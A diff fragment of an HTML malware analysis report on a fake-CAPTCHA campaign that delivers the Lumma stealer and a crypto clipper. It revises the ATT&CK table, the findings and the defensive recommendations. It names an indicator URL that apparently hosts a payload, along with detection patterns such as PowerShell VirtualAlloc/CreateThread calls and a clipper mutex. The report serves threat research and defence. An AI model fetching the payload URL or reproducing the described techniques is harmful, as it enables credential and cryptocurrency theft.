                         <td>Credentials from Password Stores</td>
-                        <td>Browser password theft</td>
+                        <td>Browser password theft (Lumma)</td>
                     </tr>
                     <tr>
                         <td><code>T1539</code></td>
@@ -1337,28 +1693,28 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                         <td>Browser cookie theft</td>
                     </tr>
                     <tr>
-                        <td><code>T1113</code></td>
-                        <td>Screen Capture</td>
-                        <td>Screenshot capability</td>
-                    </tr>
-                    <tr>
-                        <td><code>T1115</code></td>
-                        <td>Clipboard Data</td>
-                        <td>Clipboard monitoring</td>
-                    </tr>
-                    <tr>
                         <td><code>T1567</code></td>
                         <td>Exfiltration Over Web Service</td>
                         <td>Telegram Bot API exfiltration</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1027</code></td>
+                        <td>Obfuscated Files or Information</td>
+                        <td>Donut-encrypted payloads</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1070.004</code></td>
+                        <td>File Deletion</td>
+                        <td>Temporary DLL deletion</td>
                     </tr>
                 </table></div>
             </div>
         </section>
 
-        <!-- Section 11: Conclusions -->
+        <!-- Section 13: Conclusions -->
         <section>
             <div class="section-header">
-                <div class="section-number">11</div>
+                <div class="section-number">13</div>
                 <h2>Conclusions & Recommendations</h2>
             </div>
             <div class="section-content">
@@ -1367,10 +1723,11 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                     <li>Active campaign targeting <strong>charity/volunteer organization payment pages</strong></li>
                     <li>Uses <strong>fake CAPTCHA</strong> with Cloudflare branding for social engineering</li>
                     <li>Sophisticated <strong>5-stage fileless attack</strong> using Donut shellcode</li>
-                    <li>Final payload verified as <strong>.NET info stealer</strong> (Marte family) via <code>k__BackingField</code> patterns</li>
-                    <li>Targets browsers (Chrome, Firefox, Edge, Opera), crypto wallets (Atomic, Guarda), and messaging apps (Discord, Telegram)</li>
-                    <li>Exfiltrates stolen data via <strong>Telegram Bot API</strong> (<code>SendMessage</code>, <code>SendDocument</code>)</li>
-                    <li>Multi-architecture support (<code>CommandX64</code>, <code>CommandX86</code>) — works on both 32-bit and 64-bit systems</li>
+                    <li><strong>Modular payload system</strong> — C2 dynamically serves different malware</li>
+                    <li>Two confirmed payloads: <strong>Lumma Info Stealer</strong> and <strong>Marte Crypto Clipper</strong></li>
+                    <li>Clipper contains <strong>17 hardcoded attacker wallets</strong> for cryptocurrency theft</li>
+                    <li><strong>Russian origin confirmed</strong> — malware excludes systems with Russian keyboard (0x419)</li>
+                    <li>Uses <strong>.NET compilation bridge</strong> (Add-Type) for fileless API access</li>
                 </ul>
                 
                 <h3 style="color: var(--accent); margin-top: 25px;">Recommendations</h3>
@@ -1384,7 +1741,15 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                         <td><span class="tag tag-danger">CRITICAL</span></td>
                     </tr>
                     <tr>
+                        <td>Block attacker wallet addresses at network/endpoint level</td>
+                        <td><span class="tag tag-danger">CRITICAL</span></td>
+                    </tr>
+                    <tr>
                         <td>Alert on PowerShell with VirtualAlloc/CreateThread patterns</td>
+                        <td><span class="tag tag-danger">HIGH</span></td>
+                    </tr>
+                    <tr>
+                        <td>Monitor for CryptoClipboardMonitorMutex creation</td>
                         <td><span class="tag tag-danger">HIGH</span></td>
                     </tr>
                     <tr>
@@ -1399,14 +1764,30 @@ Testing: http://94.154.35.115/user_profiles_photo/cptch.bin
                         <td>Educate users: legitimate CAPTCHAs never require running commands</td>
                         <td><span class="tag tag-warning">MEDIUM</span></td>
                     </tr>
+                    <tr>
+                        <td>Use clipboard monitoring tools to detect address swapping</td>
+                        <td><span class="tag tag-warning">MEDIUM</span></td>
+                    </tr>
                 </table></div>
+
+                <div class="highlight-box critical" style="margin-top: 25px;">
+                    <h3>Final Assessment</h3>
+                    <p>
+                        This campaign demonstrates a <strong>highly sophisticated, modular malware operation</strong> 
+                        with Russian origins. The attackers have built infrastructure capable of delivering different 
+                        payloads based on targeting needs — from traditional info stealers to cryptocurrency clippers.
+                        The use of fileless techniques, Donut shellcode, and .NET compilation bridges makes detection 
+                        challenging. The explicit exclusion of Russian victims via keyboard layout checks strongly 
+                        indicates Eastern European cybercriminal origin.
+                    </p>
+                </div>
             </div>
         </section>
 
         <footer>
             <p><strong>Malware Analysis Report</strong></p>
-            <p>Fake CAPTCHA Info Stealer Campaign</p>
-            <p>Analysis Date: February 8, 2026 | Classification: TLP:CLEAR</p>
+            <p>Fake CAPTCHA Multi-Payload Campaign</p>
+            <p>Analysis Date: February 2026 | Classification: TLP:CLEAR</p>
             <p style="margin-top: 15px; font-size: 0.8em; color: #555;">
                 This report documents malware analysis conducted for educational and defensive purposes.<br>
                 IOCs may be used to improve organizational security posture.
